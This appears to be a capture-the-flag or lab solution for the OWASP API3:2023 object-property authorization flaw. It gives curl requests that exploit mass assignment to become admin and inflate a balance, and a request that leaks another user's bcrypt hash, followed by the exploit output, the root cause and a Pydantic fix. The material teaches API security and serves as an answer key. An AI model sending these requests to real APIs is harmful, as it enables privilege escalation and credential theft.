# Solution: API3:2023 Broken Object Property Level Authorization (BOPLA)

## 1. Walkthrough & Exploitation

### Step 1: Mass Assignment Privilege Escalation
```bash
curl -s -X PUT http://127.0.0.1:8000/api/v1/users/profile \
  -H "Authorization: Bearer <BOB_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "balance": 99999.0}'
```

### Exploit Evidence
```json
{
  "status": "profile_updated",
  "username": "bob",
  "role": "admin",
  "balance": 99999.0,
  "flag": "FLAG{API3_BOPLA_ADMIN_FIELD_OVERWRITTEN_7721}"
}
```

### Step 2: Excessive Property Exposure
```bash
curl -s -X GET http://127.0.0.1:8000/api/v1/users/1 \
  -H "Authorization: Bearer <BOB_ACCESS_TOKEN>"
```
Response leaks raw bcrypt hash:
```json
{
  "username": "alice",
  "hashed_password": "$2b$10$..."
}
```

---

## 2. Root Cause Analysis
The profile update controller iterated over arbitrary dictionary keys from `await request.json()` and invoked `setattr(user, key, val)`. Furthermore, the user details endpoint returned raw ORM model columns directly without filtering through a public projection DTO.

---

## 3. Patched Implementation
```python
# FIX: API3-BOPLA
class StrictUserProfileUpdate(BaseModel):
    email: Optional[str] = None
    model_config = ConfigDict(extra="forbid")

# Only update explicitly whitelisted fields
if validated_data.email is not None:
    current_user.email = validated_data.email
```
